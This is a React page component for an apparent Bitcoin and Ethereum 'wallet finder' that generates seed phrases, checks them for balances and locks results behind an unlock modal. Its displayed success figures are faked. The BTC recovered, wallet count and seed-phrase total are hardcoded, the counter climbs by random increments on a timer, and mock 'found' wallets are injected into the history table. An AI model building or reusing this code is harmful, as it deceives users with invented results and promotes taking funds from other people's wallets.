
import React, { useState, useEffect, useCallback } from 'react';
import { toast } from 'sonner';
import UnlockModal from '@/components/UnlockModal';
import WalletDashboard from '@/components/WalletDashboard';
import { useLiveCryptoPrices } from '@/hooks/useLiveCryptoPrices';
import { CryptoType } from '@/utils/walletUtils';
import { useWalletGenerator, WalletEntry } from '@/hooks/useWalletGenerator';
import StatusCards from '@/components/StatusCards';
import SeedPhraseGenerator from '@/components/SeedPhraseGenerator';
import GenerationSummary from '@/components/GenerationSummary';
import AppHeader from '@/components/AppHeader';
import AppFooter from '@/components/AppFooter';
import QuantumIntro from '@/components/QuantumIntro';
import TabbedWalletTable from '@/components/TabbedWalletTable';
import { useGetRandomWallets } from '@/hooks/useGetRandomWallets';

const Index = () => {
  const [privacyEnabled, setPrivacyEnabled] = useState(true);
  const [activeCrypto, setActiveCrypto] = useState<CryptoType>('bitcoin');
  const [isUnlockModalOpen, setIsUnlockModalOpen] = useState(false);
  const [isAccessUnlocked, setIsAccessUnlocked] = useState(false);
  const [totalValueUnlocked, setTotalValueUnlocked] = useState<{
    btc: number, 
    usd: number, 
    wallets: number, 
    totalSeedPhrases: number
  }>({
    btc: 43.1, 
    usd: 0, 
    wallets: 679,
    totalSeedPhrases: 48931056
  });
  
  const { btcPrice, ethPrice, isLoading: isPriceLoading } = useLiveCryptoPrices();
  const { 
    randomWallets, 
    isLoading: isRandomWalletsLoading, 
    addWallet, 
    addMockWallet 
  } = useGetRandomWallets(100);

  const {
    seedPhrase,
    address,
    walletStatus,
    walletData,
    isGenerating,
    isLoading,
    walletHistory,
    isAutoGenerating,
    autoCount,
    generateNewSeedPhrase,
    checkWalletBalance,
    generateAndCheck,
    toggleAutoGeneration,
    calculateMetrics
  } = useWalletGenerator(activeCrypto);

  useEffect(() => {
    if (!isAutoGenerating) {
      toggleAutoGeneration();
      toast.info('Auto-generation started for demonstration');
    }
  }, []);

  const prevTotalWallets = React.useRef(totalValueUnlocked.wallets);
  useEffect(() => {
    if (totalValueUnlocked.wallets > prevTotalWallets.current) {
      addMockWallet();
      prevTotalWallets.current = totalValueUnlocked.wallets;
    }
  }, [totalValueUnlocked.wallets, addMockWallet]);

  useEffect(() => {
    const seedPhrasesInterval = setInterval(() => {
      const randomIncrement = Math.floor(Math.random() * 2) + 1;
      setTotalValueUnlocked(prev => ({
        ...prev,
        totalSeedPhrases: prev.totalSeedPhrases + randomIncrement
      }));
    }, 3000);

    return () => clearInterval(seedPhrasesInterval);
  }, []);

  useEffect(() => {
    if (btcPrice) {
      const usdValue = totalValueUnlocked.btc * btcPrice;
      
      setTotalValueUnlocked(prev => ({
        ...prev,
        usd: usdValue
      }));
    }
  }, [btcPrice, totalValueUnlocked.btc]);
  
  useEffect(() => {
    if (walletData.balance && activeCrypto === 'bitcoin') {
      const foundBalance = parseFloat(walletData.balance) || 0;
      
      setTotalValueUnlocked(prev => {
        const newBtcTotal = prev.btc + (foundBalance * 0.1);
        return {
          btc: newBtcTotal,
          usd: newBtcTotal * (btcPrice || 0),
          wallets: prev.wallets + 1,
          totalSeedPhrases: prev.totalSeedPhrases
        };
      });
      
      if (walletHistory.length > 0) {
        const latestWallet = {
          ...walletHistory[walletHistory.length - 1],
          source: 'user' as 'global' | 'user'
        };
        addWallet(latestWallet);
      }
    }
  }, [walletData.balance, walletHistory, activeCrypto, btcPrice, addWallet]);

  const handleCryptoChange = (crypto: CryptoType) => {
    if (crypto !== activeCrypto) {
      setActiveCrypto(crypto);
      toast.success(`Switched to ${crypto === 'bitcoin' ? 'Bitcoin' : 'Ethereum'} wallet`);
    }
  };

  const toggleUnlockModal = () => {
    if (!isAccessUnlocked) {
      setIsUnlockModalOpen(true);
    } else {
      togglePrivacy();
    }
  };

  const togglePrivacy = () => {
    setPrivacyEnabled(!privacyEnabled);
    toast.info(privacyEnabled ? 'Seed phrase visible' : 'Seed phrase hidden');
  };

  const handleUnlock = () => {
    setIsAccessUnlocked(true);
    setPrivacyEnabled(false);
  };

  const toggleDeveloperAccess = () => {
    setIsAccessUnlocked(!isAccessUnlocked);
    toast.info(isAccessUnlocked ? 'Developer mode: Access locked' : 'Developer mode: Access unlocked');
    if (!isAccessUnlocked) {
      setPrivacyEnabled(false);
    }
  };

  const metrics = calculateMetrics();
  const walletMetrics = {
    totalBTC: metrics.totalBTC,
    btcValue: metrics.totalBTC * (btcPrice || 0),
    bitcoinWallets: metrics.bitcoinWallets,
    totalGenerations: metrics.totalGenerations
  };
  
  const summaryMetrics = {
    totalWallets: metrics.totalWallets,
    autoCount,
    successRate: metrics.successRate,
    totalGenerations: metrics.totalGenerations
  };

  const renderContent = () => {
    if (walletStatus === 'unlocked' && walletData.balance) {
      return (
        <div className="animate-fade-up space-y-8 w-full">
          <WalletDashboard
            address={address}
            balance={walletData.balance}
            transactions={walletData.transactions || []}
            cryptoType={activeCrypto}
          />
        </div>
      );
    }
    
    return (
      <div className="space-y-6 w-full">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className="flex flex-col space-y-6 h-full">
            <QuantumIntro 
              currentValue={totalValueUnlocked.usd} 
              btcValue={totalValueUnlocked.btc}
            />
            
            <div className="animate-fade-up bg-card/80 backdrop-blur-sm border-primary/10 rounded-lg p-4">
              <StatusCards
                totalValueUnlocked={totalValueUnlocked}
                metrics={walletMetrics}
              />
            </div>
          </div>
          
          <div className="flex flex-col space-y-6 h-full">
            <div className="bg-card/80 backdrop-blur-sm border-primary/10 rounded-lg p-4">
              <SeedPhraseGenerator
                seedPhrase={seedPhrase}
                onRegenerateSeed={generateNewSeedPhrase}
                onCheckWallet={checkWalletBalance}
                onGenerateAndCheck={generateAndCheck}
                onToggleAutoGeneration={toggleAutoGeneration}
                isLoading={isLoading}
                isGenerating={isGenerating}
                isAutoGenerating={isAutoGenerating}
                autoCount={autoCount}
                privacyEnabled={privacyEnabled}
                isAccessLocked={!isAccessUnlocked}
                onRequestUnlock={() => setIsUnlockModalOpen(true)}
              />
            </div>
            
            <div className="bg-card/80 backdrop-blur-sm border-primary/10 rounded-lg p-4">
              <GenerationSummary
                metrics={summaryMetrics}
                walletStatus={walletStatus}
                address={address}
                cryptoType={activeCrypto}
              />
            </div>
          </div>
        </div>
        
        <div className="animate-fade-up bg-card/80 backdrop-blur-sm border-primary/10 rounded-lg p-4" style={{ animationDelay: '500ms' }}>
          <h2 className="text-xl font-bold mb-4">Generated Wallets History</h2>
          <TabbedWalletTable 
            myWallets={walletHistory}
            globalWallets={randomWallets}
            isRandomWalletsLoading={isRandomWalletsLoading}
            emptyMessage="This table will store generated wallets. Click Generate or Auto Generate to begin."
            isAccessLocked={!isAccessUnlocked}
            onRequestUnlock={() => setIsUnlockModalOpen(true)}
          />
        </div>
      </div>
    );
  };

  return (
    <div className="flex flex-col min-h-screen bg-gradient-to-br from-background to-background/80">
      <AppHeader 
        activeCrypto={activeCrypto}
        onCryptoChange={handleCryptoChange}
        isAccessUnlocked={isAccessUnlocked}
        onToggleUnlock={toggleUnlockModal}
        btcPrice={btcPrice}
        isPriceLoading={isPriceLoading}
      />
      
      <main className="flex-1 pt-10 pb-8 px-3 sm:px-4 container mx-auto">
        <div className="w-full">
          {renderContent()}
        </div>
      </main>
      
      <AppFooter 
        isAccessUnlocked={isAccessUnlocked}
        onToggleDeveloperAccess={toggleDeveloperAccess}
      />
      
      <UnlockModal 
        isOpen={isUnlockModalOpen}
        onClose={() => setIsUnlockModalOpen(false)}
        onUnlock={handleUnlock}
        activeCrypto={activeCrypto}
      />
    </div>
  );
};

export default Index;
